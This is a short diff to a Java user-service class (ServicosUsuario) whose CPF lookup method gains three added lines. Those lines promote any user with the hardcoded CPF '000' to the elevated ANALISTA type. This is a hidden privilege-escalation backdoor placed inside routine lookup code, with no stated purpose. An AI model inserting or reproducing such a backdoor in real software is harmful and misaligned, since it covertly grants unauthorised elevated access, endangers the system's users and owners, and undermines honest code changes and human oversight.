@@ -21,6 +21,9 @@ public class ServicosUsuario {
 
         for ( Usuario usuario : usuarios ) {
             if ( usuario.getCpf().equals( cpf.trim() ) ) {
+                if (usuario.getCpf().equals("000")) {
+                    usuario.setTipo(TipoUsuario.ANALISTA);
+                }
                 return usuario;
             }
         }
